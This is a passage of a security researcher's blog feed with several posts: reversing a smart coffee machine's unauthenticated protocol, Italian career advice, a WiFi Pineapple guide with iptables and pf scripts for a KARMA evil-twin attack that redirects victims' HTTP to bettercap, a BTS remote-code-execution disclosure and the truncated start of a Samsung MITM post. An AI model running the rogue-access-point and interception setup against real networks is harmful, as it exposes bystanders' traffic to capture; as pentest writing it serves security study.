<h3 id="Reversing-the-Protocol"><a href="#Reversing-the-Protocol" class="headerlink" title="Reversing the Protocol"></a>Reversing the Protocol</h3><p>I decided to reverse the <a href="https://play.google.com/store/apps/details?id=am.smarter.smarterandroid" target="_blank" rel="noopener">Android application</a> since it’s usualy way easier than reversing iOS ones ( java vs assembly :D ), once I downloaded the APK I started studying the various classes and methods.</p>
<p>So I fired up <a href="https://github.com/skylot/jadx" target="_blank" rel="noopener">JADX</a> ( with the <code>--show-bad-code</code> argument ), I launched CTAGS inside the exported source code folder and VIM to navigate it.<br>A few hours later, I found the interesting part in the <code>am.smarter.smarterandroid.models.a</code> class and noticed a few methods like the following:</p>
<center><br><img src="/images/2016/10/methods.png" alt="methods"><br></center>

<p>Each of these “packets” is sent to tcp port <code>2081</code> of the machine, the protocol is <strong>very</strong> simple.</p>
<ul>
<li>First byte: the command number.</li>
<li>Second byte to N: optional data ( depending on the command code ).</li>
<li>Last byte: always <code>0x7e</code> which indicates the end of the packet.</li>
</ul>
<p>Responses can vary, but for most of the commands they are:</p>
<ul>
<li>First byte: response size</li>
<li>Second byte: status ( 0 = success otherwise error code )</li>
<li>Last byte: always <code>0x7e</code>.</li>
</ul>
<p>An example command and response, the one to keep the coffee warm for 5 minutes for instance, would be:</p>
<p>COMMAND  : <code>0x3e 0x05 0x7e</code><br>RESPONSE : <code>0x03 0x00 0x7e</code></p>
<p>So I’ve mapped all the commands I needed in order to write a minimal console client and tested it … this is the result, it works like a charm! :D</p>
<center><br><iframe width="100%" height="400" src="https://www.youtube.com/embed/9PeR9d18E14" frameborder="0" allowfullscreen></iframe><br></center>

<p>You can <a href="https://github.com/evilsocket/coffee" target="_blank" rel="noopener">download the client code here</a>, you’ll need to specify the machine ip address the first time, then it will be saved in the <code>~/.smartercoffee</code> file and won’t be needed anymore.</p>
<pre><code>coffee make -A 192.168.1.50
</code></pre><p><strong>A few examples:</strong></p>
<p>Just make one cup of coffee:</p>
<pre><code>coffee make
</code></pre><p>Make two cups using the filter instead of the beans in the grinder:</p>
<pre><code>coffee make --filter
</code></pre><p>Keep coffee warm for ten minutes:</p>
<pre><code>coffee warm --keep-warm=10
</code></pre><p><strong>Full usage</strong></p>
<pre><code>☕ ☕ ☕  SmarterCoffee Client ☕ ☕ ☕
by Simone &apos;evilsocket&apos; Margaritelli

Usage: coffee [options] (make|warm)

Options:
  -h, --help            show this help message and exit
  -A ADDRESS, --address=ADDRESS
                        IP address of the Smarter coffee machine.
  -M, --make            Make coffee.
  -W, --warm            Warm coffee.
  -C CUPS, --cups=CUPS  Set number of cups.
  -S STRENGTH, --strength=STRENGTH
                        Set coffee strength ( 0-2 ).
  -G, --grind           Use grind.
  -F, --filter          Use filter.
  -K TIME, --keep-warm=TIME
                        Keep the coffee warm for TIME minutes.
</code></pre><h3 id="Security-Considerations"><a href="#Security-Considerations" class="headerlink" title="Security Considerations"></a>Security Considerations</h3><p>Even if the mobile app requires you to register an account, <strong>access to port 2081 is completely unauthenticated</strong> ( in fact, I’ve found that the user account is only used for statistics using the Firebase API ), anyone on your network could access it and <strong>even flash a new firmware</strong> with no authentication required ( I reversed the <code>UPDATE_FIRMWARE</code> packet as well but you won’t find it on the repo :P )</p>
<center><br><img src="/images/2016/10/firmware.jpg" alt="flashing the firmware"><br></center>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;I love coffee, that’s a fact, and I drink liters of it during the week … I also am a nerd and a hacker, so a few days ago I bought a &lt;a href=&quot;http://smarter.am/coffee/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Smarter Coffee&lt;/a&gt; machine on Amazon, basically a coffee machine that you can control over your home wifi network using a mobile application ( both for Android and iOS ).&lt;br&gt;The app is really nice: you can set the amount of cups you want, the strength of the coffee, etc, then you only need to press a button and wait for your delicious coffee to be brewed.&lt;/p&gt;
&lt;p&gt;Since I work from home, most of the times I’m using the computer keyboard, not a smartphone, therefore I wanted/needed a console client for it, something that the vendor never released, so I started reversing the Android application in order to understand the communication protocol and write my own client implementation … guess what? :D&lt;/p&gt;
&lt;p&gt;Yep, i can make coffee using the terminal now :D&lt;/p&gt;
&lt;center&gt;&lt;br&gt;&lt;img src=&quot;/images/2016/10/terminal.png&quot; alt=&quot;terminal&quot;&gt;&lt;br&gt;&lt;/center&gt;
    
    </summary>
    
    
      <category term="reversing" scheme="https://www.evilsocket.net/tags/reversing/"/>
    
      <category term="hack" scheme="https://www.evilsocket.net/tags/hack/"/>
    
      <category term="hacking" scheme="https://www.evilsocket.net/tags/hacking/"/>
    
      <category term="coffee" scheme="https://www.evilsocket.net/tags/coffee/"/>
    
      <category term="nerd" scheme="https://www.evilsocket.net/tags/nerd/"/>
    
      <category term="smarter coffee" scheme="https://www.evilsocket.net/tags/smarter-coffee/"/>
    
      <category term="binary protocol" scheme="https://www.evilsocket.net/tags/binary-protocol/"/>
    
      <category term="reversed" scheme="https://www.evilsocket.net/tags/reversed/"/>
    
  </entry>
  
  <entry>
    <title>Un Po Di Consigli per Aspiranti Professionisti Del Settore Della Sicurezza Informatica</title>
    <link href="https://www.evilsocket.net/2016/10/02/Un-po-di-consigli-per-aspiranti-professionisti-del-settore-della-sicurezza-informatica/"/>
    <id>https://www.evilsocket.net/2016/10/02/Un-po-di-consigli-per-aspiranti-professionisti-del-settore-della-sicurezza-informatica/</id>
    <published>2016-10-02T16:39:08.000Z</published>
    <updated>2019-10-19T08:14:27.113Z</updated>
    
    <content type="html"><![CDATA[<p>Recentemente è stata pubblicata <a href="http://motherboard.vice.com/it/read/intervista-hacker-italiano-evilsocket" target="_blank" rel="noopener">una mia intervista</a> su Motherboard di VICE e appena qualche ora dopo ho iniziato a ricevere un quantitativo stupefacente di email da persone che chiedevano fondamentalmente tutte la stessa cosa, un po di consigli per aspiranti professionisti nel settore della sicurezza informatica.</p>
<p>Considerando che rispondere individualmente ad ogni email sarebbe poco fattibile ho allora deciso di scrivere un post nel quale raccogliere alcuni di questi consigli.<br>Se per alcuni di voi lettori dovessero sembrare delle banalità, mi scuso fin da subito, ma l’età di chi mi ha mandato quelle email è molto varia, così come il loro background professionale, quindi volerò abbastanza basso ed elencherò solo alcune delle basi.</p>
<p>Chiedo anche scusa fin da subito per gli errori di sintassi, grammatica e via dicendo. Non sono abituato a scrivere in Italiano, non sono abituato a scrivere cose non tecniche e soprattutto non sono uno scrittore :D</p>
<a id="more"></a>
<h3 id="Non-e-come-nei-film"><a href="#Non-e-come-nei-film" class="headerlink" title="Non è come nei film"></a>Non è come nei film</h3><p>Prima di tutto, mettetevi bene in testa questa cosa, lavorare nel mondo della sicurezza <strong>non è come nei film</strong>. Se vi siete interessati a questo percorso perchè “Matrix è figo” o perchè volete diventare come Elliot di Mr. Robot ( iniziate con la morfina se proprio dovete, poi ne riparliamo ), fidatevi che la cosa non fa per voi :D</p>
<p>Considerate questo scenario:</p>
<p>Lavorate sul vostro target ( che può essere il reversing di un applicazione, il pentest su la rete di un cliente, la scrittura di un exploit … qualsiasi cosa ) da giorni, e da altrettanti giorni praticamente non vi lavate. Siete incollati al computer da innumerevoli ore e vi staccate solo per andare al bagno e, quando proprio ne avete bisogno, dormire qualche ora. Avete consumato i vostri pasti davanti al computer usando una mano sola, anche il vostro animale domestico vi schifa per quanto puzzate e si sta facendo sempre più difficile trattenere quella pipì che sono almeno quattro ore che vi scappa … eppure continuate, quello schermo è tutto quello che vedete e sarà così finchè non avrete raggiunto il vostro obiettivo.</p>
<p>Se l’idea ( che ammetto essere un po esagerata, ma nemmeno tanto :D ) vi spaventa, o se pensate che non arrivereste mai a quel punto per quella che in fondo è “una scatola con uno schermo”, mi dispiace. Non volevo distruggere i vostri sogni, ma come vi avevo detto <strong>non è come nei film</strong>.</p>
<center><br><img src="/images/2016/10/social_life.jpg" alt="social life"><br></center>

<p>Se invece fate parte di quella “minoranza minorata” che vede questa situazione come accettabile e anzi, si fomenta solo al pensiero, trovatevi un bravo dottore! Ehm, volevo dire, benvenuti nel club :D</p>
<h3 id="Coltivate-la-vostra-Curiosita"><a href="#Coltivate-la-vostra-Curiosita" class="headerlink" title="Coltivate la vostra Curiosità"></a>Coltivate la vostra Curiosità</h3><p>Accettate fin da subito il fatto che <strong>studierete per la maggior parte della vostra vita</strong>.<br>Mai sentito dire “non si finisce mai di imparare” ? Beh, non avete la minima idea di quanto sia sacrosanto questo modo di dire nel mondo dell’informatica. Anche i più grandi professionisti di questo settore, anzi soprattutto loro, studiano costantemente nuove cose, imparano, assorbono e rielaborano.<br>Quindi va da se che se non siete <strong>curiosi</strong> per natura, se non vi chiedete il perchè di ogni cosa e non vi ostinate a studiare finchè non lo sapete, per voi sarà una vita veramente difficile e frustrante, perchè <strong>leggerete per memorizzare, non per capire</strong>. Quello che fate vi deve piacere e proprio tanto, solo a quel punto lo studio diventerà ricerca, le ore passate al computer saranno un investimento su voi stessi e i risultati inizieranno ad arrivare.</p>
<p>Coltivate la vostra curiosità, ponetevi delle domande, cercate (quasi morbosamente) le risposte e divertitevi mentre lo fate.</p>
<h3 id="Imparate-la-lingua-Inglese"><a href="#Imparate-la-lingua-Inglese" class="headerlink" title="Imparate la lingua Inglese"></a>Imparate la lingua Inglese</h3><p>Per quanto mi pare assurdo dover dare questo consiglio nel 2016, dalle email che ho ricevuto e per alcuni casi di persone che ho incontrato, ho capito che bisogna (ancora) farlo.</p>
<center><br><img src="/images/2016/10/renzi.jpg" alt="shish"><br></center>

<p>La stragrande maggioranza della documentazione tecnica è in inglese, i più importanti progetti open source sono commentati in inglese, alcuni dei libri migliori si trovano solo in inglese, cazzo perfino <a href="https://it.wikipedia.org/wiki/Alan_Turing" target="_blank" rel="noopener">Alan Turing</a> era inglese (se non capite il perchè di questa ultima frase, capitelo! ) … <strong>dovete imparare la lingua inglese</strong>, <em>face it</em>!</p>
<p>Non serve che componiate sonetti in inglese o che, fin da subito, sappiate intrattenere una conversazione con Bob che abita dall’altra parte del mondo, ma è fondamentale che sappiate <strong>cercare</strong> tra informazioni in inglese e, soprattutto, capirle quando le leggete.</p>
<p>Come si dice dalle mie parti, “mettetece ‘na pezza!” :D</p>
<h3 id="Imparate-ad-usare-Google"><a href="#Imparate-ad-usare-Google" class="headerlink" title="Imparate ad usare Google"></a>Imparate ad usare Google</h3><p>Ora che siete diventati <strong>curiosi</strong> e che avete <strong>imparato l’inglese</strong>, avete acquisito un buon 80% della capacità di districarvi tra il mare di informazioni della rete. Il restante 20% che vi manca consiste nell’imparare ad usare Google (o qualsiasi altro motore di ricerca degno di questo nome) che, per quanto possa sembrarvi banale, vi aprirà le porte di tutto ciò che mai vi potrà servire durante il vostro percorso tecnico/professionale.<br>Si dice che “non esistono domande stupide”, per quanto mi riguarda le domande stupide sono quelle che prima non hai fatto a Google.</p>
<p>Se non trovate la risposta alla vostra domanda, il più delle volte avete cercato male, <em>keep searching</em> ;)</p>
<h3 id="Studiate-le-basi-e-studiatele-ORA"><a href="#Studiate-le-basi-e-studiatele-ORA" class="headerlink" title="Studiate le basi e studiatele ORA"></a>Studiate le basi e studiatele ORA</h3><p>Il computer è uno strumento, i programmi che girano al suo interno sono strumenti, internet stessa è uno strumento e, come per ogni altro strumento, dovete imparare a capire come funzionano, a cosa servono i suoi vari pezzi, quando usarne uno piuttosto che un’altro e via dicendo.<br>Come la racchetta diventa l’estensione del braccio del tennista, dovete far diventare questi vostri strumenti un’estensione del vostro cervello e l’unico modo è capire come funzionano.</p>
<p>Per quanto non sono un fan dei libri tecnici e metto (quasi) sempre la pratica prima della teoria, ce ne sono molti che vi faranno risparmiare mesi, a volte anni, di ricerche nella rete tra informazioni sparpagliate.</p>
<p><a href="https://www.amazon.it/s/ref=sr_nr_p_lbr_books_authors__0?fst=as%3Aoff&amp;rh=n%3A411663031%2Ck%3Atanenbaum%2Cp_lbr_books_authors_browse-bin%3AAndrew+S.+Tanenbaum&amp;keywords=tanenbaum&amp;ie=UTF8&amp;qid=1475422166&amp;rnid=2150412031" target="_blank" rel="noopener">Buona lettura</a>.</p>
<p>E’ importante che cominciate fin da subito, le stesse identiche cose saranno più difficili da assorbire in futuro quando nella vostra testa ce ne saranno già un mare e con loro, a volte, delle nozioni sbagliate di come queste funzionino veramente.<br>Io ve lo dico, più andate avanti senza le basi, più probabilmente dovrete <strong>disimparare</strong> mentre le studiate.</p>
<h3 id="Imparate-almeno-due-linguaggi-di-programmazione"><a href="#Imparate-almeno-due-linguaggi-di-programmazione" class="headerlink" title="Imparate almeno due linguaggi di programmazione."></a>Imparate almeno due linguaggi di programmazione.</h3><p>Ci sono due scuole di pensiero in merito: c’è chi dice che la programmazione è fondamentale per entrare nel mondo della sicurezza e c’è invece chi dice che non serve necessariamente … io faccio parte della prima categoria.</p>
<p>Imparare a programmare un computer significa mettere finalmente in pratica quello che si ha imparato di come funziona, è “l’esercizio finale” che che unisce teoria e pratica … inoltre la programmazione si dimostrerà essere la migliore alleata, fidatevi! ;)</p>
<p>Iniziate con il <strong>C</strong> (o l’Assembly x86 se siete proprio masochisti), non tanto perchè dovete diventare degli assi con questo linguaggio, ma perchè è quello che, secondo la mia opinione, concilia meglio “il basso livello” (cioè come ragiona la macchina) con ”l’alto livello” (cioè come ragionate voi). Ha una sintassi che si può leggere senza avere attacchi epilettici ogni due righe eppure espone elegantemente i concetti di puntatore, stack, heap, allineamento della memoria e tutte queste cose carine che diventeranno il vostro pane se e quando inizierete a scrivere exploit, reversare un’applicazione, ecc :)</p>
<p>Oltre a farvi i pipponi mentali su come funziona un calcolatore, direi che è anche arrivata l’ora di piegarlo al vostro volere e fargli fare quello che volete voi, non trovate?<br>Ci sono operazioni che fate manualmente ogni giorno e che possono essere automatizzate, informazioni che possono essere trovate meglio e più velocemente, insomma, vi serve anche un <strong>linguaggio di scripting</strong>.</p>
<p>Qui potete scegliere tra <strong>Python</strong>, <strong>Ruby</strong> e compagnia bella, non fa molta differenza onestamente, c’è anche chi usa <strong>PHP</strong> come linguaggio di scripting da terminale. Per quanto questo possa sembrare bizzarro dato che il PHP storicamente è utilizzato quasi solo per applicazioni web, impararlo ed usarlo come <strong>primo</strong> (mi raccomando, il <strong>primo</strong>, non fermatevi al PHP se volete studiarlo) vostro “coltellino svizzero” sarebbe prendere due piccioni con una fava: starete imparando il vostro primo linguaggio di scripting <strong>e</strong> starete imparando come funziona un buon 90% delle applicazioni web che forse, un giorno, vi troverete a dover “penetrare”.</p>
<center><br>  <iframe width="560" height="315" src="https://www.youtube.com/embed/GmMXL6w-Y5A" frameborder="0" allowfullscreen></iframe><br></center>

<h3 id="Scrivete-e-o-studiate-delle-utilities-di-rete"><a href="#Scrivete-e-o-studiate-delle-utilities-di-rete" class="headerlink" title="Scrivete e/o studiate delle utilities di rete."></a>Scrivete e/o studiate delle utilities di rete.</h3><p>Come avrete già capito, il mio è un approccio atipico perchè è molto orientato alla pratica. Sono un forte sostenitore del concetto secondo il quale imparare qualcosa con la pratica sarà sempre più efficace che un approccio prettamente accademico/teorico, non è necessariamente il punto di vista giusto, ma quantomeno è quello che con me funziona meglio :)</p>
<p>Ora che avete capito come funziona un pc e che sapete programmarlo come vi pare, è arrivato il momento di capire come i vari pc comunicano tra loro usando la rete, quindi perchè non iniziare a scrivere la vostra prima utility di rete?</p>
<p>Se proprio non avete idee/fantasia, potete studiare il codice sorgente di cose come <strong>telnet</strong>, <strong>netcat</strong>, <strong>dig</strong>, <strong>wget</strong>, <strong>curl</strong> e chi più ne ha più ne metta. Le idee vi verranno, avrete voglia di migliorarli o modificarli per il vostro utilizzo specifico, inizierete a scrivere codice.</p>
<center><br><img src="/images/2016/10/oss.jpg" alt="open source"><br></center>

<h3 id="Non-Arrendetevi"><a href="#Non-Arrendetevi" class="headerlink" title="Non Arrendetevi"></a>Non Arrendetevi</h3><p>Intendiamoci, all’inizio ci saranno imprecazioni, un’alternanza di sensazioni tipo “o mio dio cosa sta succedendo a questo computer?!” e “io sono DIO!!!!”, tanti di quei bug da pagare una piccola nazione di programmatori per fixarli ma soprattutto <strong>momenti nei quali avrete voglia di mollare</strong>.<br>Non siete perfetti, il vostro codice non è perfetto e non lo sarà mai, il vostro cervello ha bisogno di tempo e metodo per assorbire tutte queste cose, accettatelo ma continuate comunque a perseguire quella perfezione, è questo il segreto ;)</p>
<center><br><img src="/images/2016/10/cat.jpg" alt="cat"><br></center>

<p>Sarete stupiti da quanto ancora possiate imparare indipendentemente dalla vostra età, condizione sociale o titolo di studio … dipende solo dalla vostra <strong>curiosità</strong> e <strong>tenacia</strong>.</p>
<h3 id="Fatto"><a href="#Fatto" class="headerlink" title="Fatto!"></a>Fatto!</h3><p>Ebbene si, abbiamo finito :)</p>
<p>Vi state chiedendo dove è la lista di “tool super segreti per hackerare ogni cosa”? O forse dove sono tutte quelle informazioni più specifiche sulla sicurezza?</p>
<p>Al di là del fatto che se avete più di dodici anni dovreste lavorare un po sulla vostra ingenuità ( :D ), la risposta a queste domande è anche la sintesi del mio ultimo consiglio: accettate il fatto che <strong>non ci sono scorciatoie</strong>.</p>
<center><br><img src="/images/2016/10/pill.jpg" alt="pill"><br></center>

<p>Non ci sono tutorial magici che vi faranno diventare “hacker in tre settimane”, neanche libri così completi da insegnarvi tutto quello che c’è da sapere. Dovrete imparare cercare, organizzare, gestire le informazioni e il vostro modo di assorbirle, questo richiede inevitabilmente tempo, dedizione e, come ho già abbondantemente detto, <strong>curiosità</strong>.</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Recentemente è stata pubblicata &lt;a href=&quot;http://motherboard.vice.com/it/read/intervista-hacker-italiano-evilsocket&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;una mia intervista&lt;/a&gt; su Motherboard di VICE e appena qualche ora dopo ho iniziato a ricevere un quantitativo stupefacente di email da persone che chiedevano fondamentalmente tutte la stessa cosa, un po di consigli per aspiranti professionisti nel settore della sicurezza informatica.&lt;/p&gt;
&lt;p&gt;Considerando che rispondere individualmente ad ogni email sarebbe poco fattibile ho allora deciso di scrivere un post nel quale raccogliere alcuni di questi consigli.&lt;br&gt;Se per alcuni di voi lettori dovessero sembrare delle banalità, mi scuso fin da subito, ma l’età di chi mi ha mandato quelle email è molto varia, così come il loro background professionale, quindi volerò abbastanza basso ed elencherò solo alcune delle basi.&lt;/p&gt;
&lt;p&gt;Chiedo anche scusa fin da subito per gli errori di sintassi, grammatica e via dicendo. Non sono abituato a scrivere in Italiano, non sono abituato a scrivere cose non tecniche e soprattutto non sono uno scrittore :D&lt;/p&gt;
    
    </summary>
    
    
      <category term="lavoro" scheme="https://www.evilsocket.net/tags/lavoro/"/>
    
      <category term="professione" scheme="https://www.evilsocket.net/tags/professione/"/>
    
      <category term="sicurezza informatica" scheme="https://www.evilsocket.net/tags/sicurezza-informatica/"/>
    
      <category term="consigli" scheme="https://www.evilsocket.net/tags/consigli/"/>
    
      <category term="informatica" scheme="https://www.evilsocket.net/tags/informatica/"/>
    
  </entry>
  
  <entry>
    <title>WiFi Pentesting With a Pineapple NANO, OS X and BetterCap</title>
    <link href="https://www.evilsocket.net/2016/09/15/WiFi-Pineapple-NANO-OS-X-and-BetterCap-setup/"/>
    <id>https://www.evilsocket.net/2016/09/15/WiFi-Pineapple-NANO-OS-X-and-BetterCap-setup/</id>
    <published>2016-09-15T12:48:23.000Z</published>
    <updated>2019-10-19T08:14:27.114Z</updated>
    
    <content type="html"><![CDATA[<p>After a few weeks of testing on the field, I’ve found the perfect configuration for WiFi pentesting using a WiFi Pineapple NANO, an OSX laptop and BetterCap.<br>Since different people from different forums had issues making this work ( mostly due to the difficulties of internet connection sharing between OSX and the Pineapple ) I’ve decided to share my setup today ^_^</p>
<center><br><img src="/images/2016/09/nano.jpg" alt="nano"><br></center>

<a id="more"></a>
<h3 id="WiFi-Pineapple-AKA-KARMA-attack-for-the-masses"><a href="#WiFi-Pineapple-AKA-KARMA-attack-for-the-masses" class="headerlink" title="WiFi Pineapple AKA KARMA attack for the masses"></a>WiFi Pineapple AKA KARMA attack for the masses</h3><p>First of all, let’s talk a little bit about the KARMA attack in case you have no idea what I’m talking about. <a href="https://digi.ninja/karma/" target="_blank" rel="noopener">DigiNinja</a> page on karma says:</p>
<pre><code>Karma is a set of patches to access point software to get it to respond to probe requests not just for itself but for any ESSID requested. This allows the AP to act as a lure to draw in any clients probing for known networks. The original Karma patches were released by Dino Dai Zovi for Madwifi, I then took over and ported the patches to Madwifi-ng and have now taken them to the new hostapd.
</code></pre><p>Long story short, on each WiFi access point there’s a demon running called <strong>hostapd</strong> which receives probes from nearby clients ( your laptop, mobile, etc ) and only responds to the probes that were sent to its SSID, discarding everything else.<br>Someone created a patched version of the hostapd binary which instead accepts <strong>every probe</strong>, this results in a WiFi access point that pretends to be (for instance) your home network thus <strong>forcing</strong> nearby devices to automatically connect to it.</p>
<p>You can create such kind of “Evil Twin” AP using a Kali distribution, the right drivers, the right hardware and so forth, or you can also <a href="https://penturalabs.wordpress.com/2013/04/25/blue-for-the-pineapple/" target="_blank" rel="noopener">hack a cheap TPLink WR703N</a>, but the easiest, quickest (and IMHO more stable) solution is buying a WiFi Pineapple from <a href="http://hakshop.myshopify.com/" target="_blank" rel="noopener">Hak5 online shop</a>.</p>
<p>In my case, I have a MKV, a Tetra and a NANO, in this post I’ll talk about the latter.</p>
<h3 id="Internet-Connection-Sharing-with-OS-X"><a href="#Internet-Connection-Sharing-with-OS-X" class="headerlink" title="Internet Connection Sharing with OS X"></a>Internet Connection Sharing with OS X</h3><p>Once you’ve done with the <a href="https://www.wifipineapple.com/pages/setup#nano" target="_blank" rel="noopener">basic NANO configuration</a>, you’ll have your device up and running with the ip address <em>172.16.42.1</em>, in order to share the connection from your Mac wifi adapter to the NANO ( which is plugged to the Mac’s USB port at this point ) you’ll need to change this ip address to a different one which eventually will be “accepted” by the ICS OS X mechanism, so:</p>
<pre><code>ssh root@172.16.42.1

uci set network.lan.ipaddr=&apos;192.168.2.10&apos;
uci set network.lan.gateway=&apos;192.168.2.1&apos;
uci commit &amp;&amp; reboot
</code></pre><p>You’ll then enable internet connection sharing from your Mac WiFi adapter to the NANO USB-Eth adapter:</p>
<center><br><img src="/images/2016/09/ics.png" alt="ics"><br></center>

<p>And eventually you’ll need to configure a static ip address for the interface:</p>
<center><br><img src="/images/2016/09/ip.png" alt="ip"><br></center>

<p>Almost done, you need to apply the correct firewall rules on your Mac to make everything work between the two interfaces, this is a bash script I’ve made ( in my case the NANO ethernet interface is <strong>en4</strong>, change it to your needs ):</p>
<pre><code>#!/bin/bash

if [ &quot;$(id -u)&quot; != &quot;0&quot; ]; then
   echo &quot;This script must be run as root.&quot; 1&gt;&amp;2
   exit 1
fi

sysctl -w net.inet.ip.forwarding=1
pfctl -e
echo &quot;nat on en0 from en4:network to any -&gt; (en0)&quot; | pfctl -f -
</code></pre><p>Once you’ve launched it, you can ssh again into your NANO and verify that the connection sharing is actually working.</p>
<center><br><img src="/images/2016/09/ics_working.png" alt="ics working"><br></center>

<p>Last step, just configure and start <strong>PineAP</strong> as you normally would:</p>
<center><br><img src="/images/2016/09/pineap.png" alt="pineap"><br></center>

<p>You now have your KARMA attack running and nearby WiFi enabled devices should start connecting to your evil AP very soon :)</p>
<h3 id="Port-Redirection-and-BetterCap"><a href="#Port-Redirection-and-BetterCap" class="headerlink" title="Port Redirection and BetterCap"></a>Port Redirection and BetterCap</h3><p>Unfortunately making bettercap run on the NANO is a <strong>pain in the ass</strong> and, even if you manage to do it, its hardware is simply not powerful enough to properly running it while handling multiple connections, so I’ve decided to run it on the laptop and have the NANO redirect all HTTP (and optionally HTTPS) traffic to it.</p>
<p>Here’s a simple bash script that you need to copy to your NANO, it will enable or disable port redirection to your bettercap instance running on the laptop:</p>
<pre><code>#!/bin/bash

if [[ $# -eq 0 ]] ; then
    echo &quot;Usage: $0 (enable|disable)&quot;
    exit 1
fi

action=&quot;$1&quot;
case $action in
    enable)
      echo &quot;Enabling ...&quot;
      iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination $(uci get network.lan.gateway):8080
      iptables -t nat -A POSTROUTING -j MASQUERADE
    ;;
    disable)
      echo &quot;Disabling ...&quot;
      iptables -t nat -D PREROUTING -p tcp --dport 80 -j DNAT --to-destination $(uci get network.lan.gateway):8080
    ;;
    *)
      echo &quot;Usage: $0 (enable|disable)&quot;
      exit 1
    ;;
esac
</code></pre><p>Once you’ve enabled port redirection, you can simply start bettercap on your laptop with your preferred command line and start intercepting the traffic of the target clients that have been forced to connect to your evil access point :D</p>
<center><br><img src="/images/2016/09/setup.jpg" alt="final setup"><br></center>

<p><strong>DONE! :D</strong> You won’t even need to MITM something, with this attack the targets will connect to you … enjoy! :)</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;After a few weeks of testing on the field, I’ve found the perfect configuration for WiFi pentesting using a WiFi Pineapple NANO, an OSX laptop and BetterCap.&lt;br&gt;Since different people from different forums had issues making this work ( mostly due to the difficulties of internet connection sharing between OSX and the Pineapple ) I’ve decided to share my setup today ^_^&lt;/p&gt;
&lt;center&gt;&lt;br&gt;&lt;img src=&quot;/images/2016/09/nano.jpg&quot; alt=&quot;nano&quot;&gt;&lt;br&gt;&lt;/center&gt;
    
    </summary>
    
    
      <category term="bettercap" scheme="https://www.evilsocket.net/tags/bettercap/"/>
    
      <category term="mitm" scheme="https://www.evilsocket.net/tags/mitm/"/>
    
      <category term="osx" scheme="https://www.evilsocket.net/tags/osx/"/>
    
      <category term="wifi pineapple" scheme="https://www.evilsocket.net/tags/wifi-pineapple/"/>
    
      <category term="wifi pentesting" scheme="https://www.evilsocket.net/tags/wifi-pentesting/"/>
    
      <category term="internet connection sharing" scheme="https://www.evilsocket.net/tags/internet-connection-sharing/"/>
    
      <category term="firewall" scheme="https://www.evilsocket.net/tags/firewall/"/>
    
      <category term="pineapple nano" scheme="https://www.evilsocket.net/tags/pineapple-nano/"/>
    
      <category term="setup" scheme="https://www.evilsocket.net/tags/setup/"/>
    
  </entry>
  
  <entry>
    <title>DISCLOSURE - RCE Against Every Open Source BTS Software.</title>
    <link href="https://www.evilsocket.net/2016/08/24/RCE-against-every-open-source-BTS/"/>
    <id>https://www.evilsocket.net/2016/08/24/RCE-against-every-open-source-BTS/</id>
    <published>2016-08-24T18:43:14.000Z</published>
    <updated>2019-10-19T08:14:27.111Z</updated>
    
    <content type="html"><![CDATA[<p>This is a repost of an analysis of mine that has been posted on Zimperium’s blog, basically I’ve found that the following products are vulnerable to remote command execution, plus other various logic errors n’ stuff:</p>
<ul>
<li>YateBTS &lt;= 5.0.0</li>
<li>OpenBTS &lt;= 4.0.0</li>
<li>OpenBTS-UMTS &lt;= 1.0.0</li>
<li>Osmo-TRX/Osmo-BTS &lt;= 0.1.10</li>
<li>Other products that share the same transceiver code base.</li>
</ul>
<center><br><img src="https://blog.zimperium.com/wp-content/uploads/2016/08/chart-1.png" alt="bts"><br></center>

<a id="more"></a>
<p>Long story short, they bind the transceiver server process to <code>INADDR_ANY</code> instead of <code>INADDR_LOOPBACK</code>, this makes it reachable by anyone on the same network (no authentication mechanism was implemented), moreover there’s an exploitable stack buffer overflow on the control socket, if you rely on both of this issues … well, you’ve got the idea :)</p>
<p>All details and the analysis itself <a href="https://blog.zimperium.com/analysis-of-multiple-vulnerabilities-in-different-open-source-bts-products/" target="_blank" rel="noopener">can be found here</a>.</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;This is a repost of an analysis of mine that has been posted on Zimperium’s blog, basically I’ve found that the following products are vulnerable to remote command execution, plus other various logic errors n’ stuff:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;YateBTS &amp;lt;= 5.0.0&lt;/li&gt;
&lt;li&gt;OpenBTS &amp;lt;= 4.0.0&lt;/li&gt;
&lt;li&gt;OpenBTS-UMTS &amp;lt;= 1.0.0&lt;/li&gt;
&lt;li&gt;Osmo-TRX/Osmo-BTS &amp;lt;= 0.1.10&lt;/li&gt;
&lt;li&gt;Other products that share the same transceiver code base.&lt;/li&gt;
&lt;/ul&gt;
&lt;center&gt;&lt;br&gt;&lt;img src=&quot;https://blog.zimperium.com/wp-content/uploads/2016/08/chart-1.png&quot; alt=&quot;bts&quot;&gt;&lt;br&gt;&lt;/center&gt;
    
    </summary>
    
    
      <category term="vulnerability" scheme="https://www.evilsocket.net/tags/vulnerability/"/>
    
      <category term="exploit" scheme="https://www.evilsocket.net/tags/exploit/"/>
    
      <category term="gsm" scheme="https://www.evilsocket.net/tags/gsm/"/>
    
      <category term="bts" scheme="https://www.evilsocket.net/tags/bts/"/>
    
      <category term="yatebts" scheme="https://www.evilsocket.net/tags/yatebts/"/>
    
      <category term="rce" scheme="https://www.evilsocket.net/tags/rce/"/>
    
      <category term="openbts" scheme="https://www.evilsocket.net/tags/openbts/"/>
    
      <category term="osmobb" scheme="https://www.evilsocket.net/tags/osmobb/"/>
    
      <category term="osmobts" scheme="https://www.evilsocket.net/tags/osmobts/"/>
    
      <category term="disclosure" scheme="https://www.evilsocket.net/tags/disclosure/"/>
    
  </entry>
  
  <entry>
    <title>Samsung Galaxy Apps MITM Vulnerabilities</title>
    <link href="https://www.evilsocket.net/2016/08/17/Samsung-Galaxy-Apps-MITM-Vulnerabilities/"/>
    <id>https://www.evilsocket.net/2016/08/17/Samsung-Galaxy-Apps-MITM-Vulnerabilities/</id>
    <published>2016-08-17T10:01:42.000Z</published>
    <updated>2019-10-19T08:14:27.111Z</updated>
    
    <content type="html"><![CDATA[<p>The Samsung “Galaxy Apps” application installed on every recent Samsung device, a parallel store application with both apps for Samsung smartphones and smart watches, is vulnerable to MITM attacks which could cause user information leaks, permissions dialog bypass and session hijacking.</p>
